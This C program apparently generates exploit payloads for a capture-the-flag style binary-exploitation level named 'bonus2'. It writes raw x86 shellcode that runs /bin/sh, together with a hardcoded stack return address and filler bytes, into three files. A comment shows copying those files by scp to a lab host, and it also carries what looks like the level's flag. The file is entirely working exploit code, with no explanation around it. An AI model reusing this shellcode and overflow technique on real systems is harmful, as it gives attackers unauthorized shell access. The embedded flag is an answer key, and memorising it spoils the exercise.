#include <unistd.h>
#include <stdio.h>

//gcc script.c && ./a.out && scp -P 4242 payload_fi payload_nl payload_b2 bonus2@192.168.56.102:/tmp
//579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245

int main() {
	int asm_address = 0xbffff680;
	int bin_sh_address = asm_address + 18;

	FILE *file = fopen("payload_b2", "w");
	fwrite((char[1]){0xbb}, 1, 1, file);
	fwrite(&bin_sh_address, 1, 4, file);
	fwrite((char[13]){0x31, 0xc0, 0x88, 0x43, 0x07, 0xb0, 0x0b, 0x31, 0xc9, 0x31, 0xd2, 0xcd, 0x80}, 1, 13, file);
	fprintf(file, "/bin/sh0");
	for (int i = 0; i < 40 - 18 - 8; ++i)
		fputc('B', file);
	fclose(file);

	file = fopen("payload_fi", "w");
	for (int i = 0; i < 32; ++i)
		fputc('B', file);
	fputc('\n', file);
	fseek(file, 18, SEEK_SET);
	fwrite(&asm_address, 1, 4, file);
	fclose(file);

	file = fopen("payload_nl", "w");
	for (int i = 0; i < 32; ++i)
		fputc('B', file);
	fputc('\n', file);
	fseek(file, 23, SEEK_SET);
	fwrite(&asm_address, 1, 4, file);
	fclose(file);
}